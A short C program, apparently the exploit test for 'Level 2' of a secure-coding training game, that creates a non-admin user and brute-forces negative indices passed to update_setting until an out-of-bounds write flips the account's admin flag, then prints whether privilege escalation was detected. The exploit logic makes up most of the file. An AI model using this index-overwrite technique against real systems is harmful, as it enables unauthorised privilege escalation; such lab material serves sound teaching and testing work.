#include "code.h"
#include <stdio.h>

int main() {
    printf("Level 2 \n\n");
    // Creates a non-admin username called "pwned"
    int user1 = create_user_account(false, "pwned");
    printf("0. Non-admin (admin:%i) username called '%s' has been created \n", is_admin(user1), username(user1));

    // Brute-force to find the index of isAdmin
    for (int i = -1; i > -100; i--) {
        char index[10];
        snprintf(index, sizeof(index), "%d", i);
        update_setting(user1, index, "1");
        if (is_admin(user1)) {
            printf("Found isAdmin at index %d\n", i);
            break;
        }
    }

    printf("1. A dummy setting has been set to dummy number '1' \n");
    printf("2. Making sure user '%s' is not an admin by performing a check -> [Result] Admin:%i \n\n", username(user1), is_admin(user1));

    if (is_admin(user1))
        printf("<SOS> PRIVILEGE ESCALATION ATTACK DETECTED\n");
    else
        printf("CONGRATULATIONS LEVEL 2 PASSED!\n");

    return 0;
}
